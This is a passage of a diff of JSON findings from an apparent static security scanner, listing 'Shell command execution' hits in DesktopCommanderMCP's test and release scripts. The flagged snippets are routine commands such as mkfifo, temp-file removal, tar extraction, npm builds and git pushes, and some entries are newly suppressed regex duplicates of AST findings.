      "line": 20,
      "snippet": "execSync(`mkfifo ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-threadpool-starvation.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
      "line": 36,
      "snippet": "execSync(`rm -f ${fifo} ${probe}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-threadpool-starvation.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
      "line": 43,
      "snippet": "execSync(`rm -f ${fifo} ${probe}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-read-abort-frees-thread.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
+     "line": 20,
+     "snippet": "try { execSync(`mkfifo ${fifo}`); } catch (e) { console.error('mkfifo failed', e.message); process.exit(1); }",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
+     "line": 36,
+     "snippet": "try { execSync(`rm -f ${fifo} ${probe}`); } catch {}",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-threadpool-starvation.js",
+     "line": 43,
+     "snippet": "execSync(`rm -f ${fifo} ${probe}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-read-abort-frees-thread.js",
      "line": 24,
      "snippet": "execSync(`dd if=/dev/zero of=${big} bs=1m count=800 2>/dev/null`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-read-abort-frees-thread.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-read-abort-frees-thread.js",
      "line": 40,
      "snippet": "execSync(`rm -f ${big}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-bootstrap-threadpool.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-read-abort-frees-thread.js",
+     "line": 24,
+     "snippet": "execSync(`dd if=/dev/zero of=${big} bs=1m count=800 2>/dev/null`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-read-abort-frees-thread.js",
+     "line": 40,
+     "snippet": "execSync(`rm -f ${big}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
      "line": 13,
      "snippet": "execSync(`mkfifo ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-bootstrap-threadpool.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
      "line": 19,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-bootstrap-threadpool.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
      "line": 23,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-dc-tracking-gate.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
+     "line": 13,
+     "snippet": "execSync(`mkfifo ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
+     "line": 19,
+     "snippet": "const guard = setTimeout(() => { log(`BLOCKED >3000ms -> bootstrap did NOT help`); execSync(`rm -f ${fifo}`); process.exit(1); }, 3000);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-bootstrap-threadpool.js",
+     "line": 23,
+     "snippet": "execSync(`rm -f ${fifo}`); process.exit(0);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
      "line": 20,
      "snippet": "execSync(`mkfifo ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-dc-tracking-gate.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
      "line": 39,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-dc-tracking-gate.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
      "line": 45,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-withtimeout-leak.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
+     "line": 20,
+     "snippet": "execSync(`mkfifo ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
+     "line": 39,
+     "snippet": "execSync(`rm -f ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-dc-tracking-gate.js",
+     "line": 45,
+     "snippet": "execSync(`rm -f ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
      "line": 16,
      "snippet": "execSync(`mkfifo ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-withtimeout-leak.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
      "line": 32,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-withtimeout-leak.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
      "line": 38,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-env-threadpool-timing.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
+     "line": 16,
+     "snippet": "execSync(`mkfifo ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
+     "line": 32,
+     "snippet": "execSync(`rm -f ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-withtimeout-leak.js",
+     "line": 38,
+     "snippet": "execSync(`rm -f ${fifo}`);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
      "line": 13,
      "snippet": "execSync(`mkfifo ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-env-threadpool-timing.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
      "line": 19,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:test/repro/test-env-threadpool-timing.js",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
      "line": 23,
      "snippet": "execSync(`rm -f ${fifo}`)",
      "ctx": "test",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/download-all-ripgrep.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
+     "line": 13,
+     "snippet": "execSync(`mkfifo ${fifo}`);           // child_process, not threadpool",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
+     "line": 19,
+     "snippet": "const guard = setTimeout(() => { log(`BLOCKED >3000ms -> env set too late, pool still 4`); execSync(`rm -f ${fifo}`); process.exit(0); }, 3000);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:test/repro/test-env-threadpool-timing.js",
+     "line": 23,
+     "snippet": "execSync(`rm -f ${fifo}`); process.exit(0);",
+     "ctx": "test",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/download-all-ripgrep.cjs",
      "line": 131,
      "snippet": "execSync(`tar -xzf \"${tarPath}\" -C \"${tempExtractDir}\"`, { stdio: 'pipe' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/build-mcpb.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/download-all-ripgrep.cjs",
+     "line": 131,
+     "snippet": "execSync(`tar -xzf \"${tarPath}\" -C \"${tempExtractDir}\"`, { stdio: 'pipe' });",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
      "line": 27,
      "snippet": "execSync('node scripts/download-all-ripgrep.cjs', { cwd: PROJECT_ROOT, stdio: 'inherit' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/build-mcpb.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
      "line": 37,
      "snippet": "execSync('npm run build', { cwd: PROJECT_ROOT, stdio: 'inherit' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/build-mcpb.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
      "line": 131,
      "snippet": "execSync('npm install --omit=dev --production', { cwd: BUNDLE_DIR, stdio: 'inherit' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/build-mcpb.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
      "line": 177,
      "snippet": "execSync(`npx @anthropic-ai/mcpb validate \"${MANIFEST_PATH}\"`, { stdio: 'inherit' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/build-mcpb.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
      "line": 188,
      "snippet": "execSync(`npx @anthropic-ai/mcpb pack \"${BUNDLE_DIR}\" \"${outputFile}\"`, { stdio: 'inherit' })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
+     "line": 177,
+     "snippet": "execSync(`npx @anthropic-ai/mcpb validate \"${MANIFEST_PATH}\"`, { stdio: 'inherit' });",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/build-mcpb.cjs",
+     "line": 188,
+     "snippet": "execSync(`npx @anthropic-ai/mcpb pack \"${BUNDLE_DIR}\" \"${outputFile}\"`, { stdio: 'inherit' });",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 61,
      "snippet": "execSync(command, {",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 70,
      "snippet": "exec(command, { silent: true, ...options })",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 291,
      "snippet": "exec(command)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 329,
      "snippet": "exec(`git tag -f ${tag}`)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 330,
      "snippet": "exec(`git push -f origin ${tag}`)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 413,
      "snippet": "exec(options.skipTests ? 'npm run build' : 'npm test')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 416,
      "snippet": "exec('npm publish --tag alpha')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 468,
      "snippet": "exec(options.skipTests ? 'npm run build' : 'npm test')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 482,
      "snippet": "exec(bumpCommand)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 499,
      "snippet": "exec('git add package.json server.json src/version.ts')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 500,
      "snippet": "exec(`git commit -m \"Release ${tagName}",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 505,
      "snippet": "exec(`git tag ${tagName}`)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 508,
      "snippet": "exec('git push origin main')",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
     },
     {
      "rule": "ATL-CE-001",
      "sev": "medium",
-     "file": "https://github.com/wonderwhy-er/DesktopCommanderMCP@ea3ed35a7be9:scripts/publish-release.cjs",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
      "line": 509,
      "snippet": "exec(`git push origin ${tagName}`)",
      "ctx": "src",
      "title": "Shell command execution (AST: child_process.exec)",
      "method": "ast",
      "loc": "code",
-     "source": "index"
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
+     "line": 329,
+     "snippet": "exec(`git tag -f ${tag}`);",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
+     "line": 330,
+     "snippet": "exec(`git push -f origin ${tag}`);",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
+     "line": 500,
+     "snippet": "exec(`git commit -m \"Release ${tagName}",
+     "ctx": "src",
+     "title": "Shell command execution (shell=True / os.system / child_process.exec)",
+     "method": "regex",
+     "suppressed": true,
+     "why": "duplicate of AST finding",
+     "source": "fetch"
+    },
+    {
+     "rule": "ATL-CE-001",
+     "sev": "medium",
+     "file": "https://github.com/wonderwhy-er/desktopcommandermcp@c774c3b505de:scripts/publish-release.cjs",
+     "line": 505,
